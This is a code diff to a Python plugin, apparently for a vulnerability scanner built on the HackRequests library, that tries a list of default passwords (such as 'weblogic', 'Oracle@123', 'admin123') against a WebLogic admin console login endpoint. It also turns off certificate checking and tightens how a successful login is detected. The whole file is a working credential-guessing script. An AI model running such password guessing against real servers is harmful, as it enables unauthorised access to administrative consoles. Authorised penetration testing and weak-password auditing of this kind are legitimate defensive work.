@@ -1,5 +1,5 @@
-# Author:w8ay
-# Name:测试DEMO
+# Author:Joe
+# Name:weblogic_weak
 
 import HackRequests
 
@@ -10,7 +10,7 @@ def poc(arg, **kwargs):
         "Content-Type": "application/x-www-form-urlencoded"
     }
     payload = "/console/j_security_check"
-    passwd = ["weblogic", "weblogic1", "weblogic12", "weblogic123", "admin", "admin123"]
+    passwd = ["weblogic", "Oracle@123", "weblogic12", "weblogic123", "admin", "admin123","weblogic1"]
     vulnurl = arg + payload
     dict_pwd = []
     for pwd in passwd:
@@ -29,11 +29,12 @@ def poc(arg, **kwargs):
         passwd = account[1]
         post_data = {
             "j_username": username,
-            "j_password": passwd
+            "j_password": passwd,
+            'j_character_encoding': 'UTF-8'
         }
         try:
-            hh = HackRequests.http(vulnurl,post = post_data, headers = headers,location = False)
-            if hh.status_code == 302 and r"console" in hh.text():
+            hh = HackRequests.http(vulnurl,post = post_data, headers = headers,location = False,verify=False)
+            if hh.status_code == 302 and 'console' in hh.text() and 'LoginForm.jsp' not in hh.text():
                 result = {
                     "name": "weblogic 弱口令",  # 插件名称
                     "content": "存在weblogic弱口令 INFO:{}".format(repr(post_data)),  # 插件返回内容详情，会造成什么后果。
@@ -45,7 +46,3 @@ def poc(arg, **kwargs):
 
         except:
             pass
-
-
-if __name__ == "__main__":
-    pass
